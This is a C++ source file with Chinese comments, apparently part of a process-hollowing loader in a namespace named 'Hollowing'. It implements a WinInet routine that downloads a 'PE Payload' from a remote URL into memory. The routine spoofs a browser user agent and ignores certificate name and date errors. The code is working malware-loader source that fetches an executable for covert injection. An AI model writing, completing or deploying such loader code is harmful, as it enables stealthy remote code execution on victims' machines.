#include "../include/Network.h"

namespace Hollowing {
    /**
     * @brief 使用 WinInet API 下载 PE Payload
     * 
     * 该实现支持：
     * 1. 自动识别 HTTP/HTTPS。
     * 2. HTTPS 下自动处理 SSL 标志。
     * 3. 缓冲区读取模式。
     */
    bool Network::DownloadPE(const std::string& url, std::vector<BYTE>& outData) {
        LOG_INFO("正在从远程地址下载 PE: " + url);

        // 1. 初始化 Internet 会话
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) {
            LOG_ERROR("InternetOpenA 失败");
            return false;
        }

        // 2. 动态设置标志位 (如果是 HTTPS 则开启加密标志)
        DWORD flags = INTERNET_FLAG_RELOAD;
        if (url.find("https://") == 0) {
            flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
        }

        // 3. 打开目标 URL
        HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, flags, 0);
        if (!hConnect) {
            LOG_ERROR("InternetOpenUrlA 失败 (请检查服务器是否在线或 URL 是否正确)");
            InternetCloseHandle(hInternet);
            return false;
        }

        // 4. 循环读取数据到缓冲区
        BYTE buffer[4096];
        DWORD bytesRead;
        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            outData.insert(outData.end(), buffer, buffer + bytesRead);
        }

        // 5. 清理句柄
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        if (outData.empty()) {
            LOG_ERROR("下载的数据为空");
            return false;
        }

        LOG_INFO("下载完成。文件大小: " + std::to_string(outData.size()) + " 字节");
        return true;
    }
}
